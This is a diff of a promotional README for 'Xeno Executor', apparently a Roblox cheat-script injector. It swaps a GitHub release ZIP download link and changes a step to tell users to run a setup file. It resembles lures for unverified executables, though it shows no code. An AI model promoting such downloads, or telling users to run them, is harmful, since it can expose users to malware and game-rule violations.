@@ -10,7 +10,7 @@
 
 ![xeno](https://github.com/user-attachments/assets/aebee8e6-730f-4150-b2e9-65608b418581)
 
-# ***[📂 Download Now](https://github.com/just-cmd-1909/Xeno-ExecutorX/releases/download/%23Xeno-Roblox-Executor/Xeno-v1.1.0-x64.zip)***  
+# ***[📂 Download Now](https://github.com/just-cmd-1909/Xeno-Executor/releases/download/%23Xeno-Roblox-Executor/Xeno-v1.1.0-x64.zip)***  
 
 ---
 
@@ -40,7 +40,7 @@ Xeno Executor is crafted for Roblox enthusiasts who want to enhance their gamepl
 
 1. **Click the “Download” button** above to get the ZIP file.  
 2. Extract the files to a secure folder on your PC.  
-3. Open Xeno Executor and follow the on-screen setup guide.  
+3. Open Xeno Setup File and then run Xeno.  
 4. Load your favorite script, inject, and enjoy a next-level Roblox experience! 🎉  
 
 ---
